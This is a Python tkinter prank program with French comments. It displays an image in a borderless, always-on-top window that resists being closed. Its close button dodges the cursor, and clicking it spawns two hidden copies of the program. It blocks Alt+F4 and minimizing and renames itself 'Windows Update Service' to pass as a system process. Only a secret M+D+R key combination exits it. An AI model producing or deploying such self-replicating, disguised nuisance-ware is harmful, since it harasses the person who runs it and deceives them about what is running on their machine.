import tkinter as tk
from PIL import Image, ImageTk
import random
import pygame
import requests
from io import BytesIO
import os
import sys
import subprocess
import ctypes  

# 🎵 Initialiser pygame pour la musique
pygame.mixer.init()

# 🔁 Se relancer en double si fermé
def relaunch():
    for _ in range(2):  # Se relance 2 fois
        subprocess.Popen([sys.executable, __file__], creationflags=subprocess.CREATE_NO_WINDOW)
    sys.exit()

# 🤡 Déplacer le bouton Fermer
def move_close_button(event):
    new_x = random.randint(0, root.winfo_width() - close_button.winfo_width())
    new_y = random.randint(30, root.winfo_height() - close_button.winfo_height())
    close_button.place(x=new_x, y=new_y)

# 😈 Empêcher la fermeture classique
def on_close():
    print("Haha, tu ne peux pas fermer cette fenêtre ! 😈")
    relaunch()  # Se relance en double

def disable_alt_f4(event):
    return "break"

# 🛑 Empêcher la réduction
def prevent_minimize(event):
    root.deiconify()

# 📌 Déplacement aléatoire
def animate_window_move(start_x, start_y, end_x, end_y, steps=20):
    delta_x = (end_x - start_x) / steps
    delta_y = (end_y - start_y) / steps

    def step_animation(step=0):
        if step <= steps:
            x = int(start_x + delta_x * step)
            y = int(start_y + delta_y * step)
            root.geometry(f"+{x}+{y}")
            root.after(10, step_animation, step + 1)

    step_animation()

def move_window_randomly(event):
    start_x = root.winfo_x()
    start_y = root.winfo_y()
    end_x = random.randint(0, root.winfo_screenwidth() - root.winfo_width())
    end_y = random.randint(0, root.winfo_screenheight() - root.winfo_height())
    animate_window_move(start_x, start_y, end_x, end_y)

def move_window_on_hover(event):
    if 0 <= event.x <= root.winfo_width():
        move_window_randomly(event)

# 🖼️ Télécharger et afficher l'image
def load_image(url):
    response = requests.get(url)
    image = Image.open(BytesIO(response.content))
    image = image.resize((600, 400), Image.Resampling.LANCZOS)
    return ImageTk.PhotoImage(image)

# 🔑 Raccourci secret pour fermer (M + D + R)
pressed_keys = set()
def on_key_press(event):
    pressed_keys.add(event.keysym.lower())
    if {"m", "d", "r"}.issubset(pressed_keys):
        sys.exit()  # Quitter proprement

def on_key_release(event):
    pressed_keys.discard(event.keysym.lower())

# 🚀 Initialisation de la fenêtre
root = tk.Tk()
root.geometry("600x400")
root.overrideredirect(1)  # Supprime la barre de titre
root.attributes("-topmost", True)  # Toujours devant

# 🛠️ Changer le nom du processus dans le gestionnaire des tâches
try:
    ctypes.windll.kernel32.SetConsoleTitleW("Windows Update Service")
except:
    pass  # Ignore si non Windows

# 📌 Simuler une barre de titre
title_bar = tk.Frame(root, bg="white", relief="raised", bd=2)
title_bar.pack(side="top", fill="x")

title_label = tk.Label(title_bar, text="Troll - Essaie de me fermer pour voir !!!", bg="white", fg="black", font=("Arial", 10))
title_label.pack(side="left", padx=10)

button_frame = tk.Frame(title_bar, bg="white")
button_frame.pack(side="right", padx=5)

# ❌ Faux bouton de fermeture
close_button = tk.Button(button_frame, text="×", bg="white", fg="black", relief="flat", command=on_close, font=("Arial", 12))
close_button.pack(side="left", padx=2)

# 🔗 Charger l'image depuis une URL
image_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSzlea8N9CeqzbFMqc3wNri1Gs-KyyTsfhMzg&s"
photo = load_image(image_url)

# 📷 Afficher l'image
image_label = tk.Label(root, image=photo)
image_label.pack(fill="both", expand=True)

# 🔒 Bloquer Alt+F4 et la réduction
root.bind("<Alt-F4>", disable_alt_f4)
root.bind("<Unmap>", prevent_minimize)

# 🖱️ Déplacement troll
title_bar.bind("<Enter>", move_window_on_hover)
root.bind("<KeyPress>", on_key_press)
root.bind("<KeyRelease>", on_key_release)

# 🔥 Lancer la boucle principale
root.mainloop()
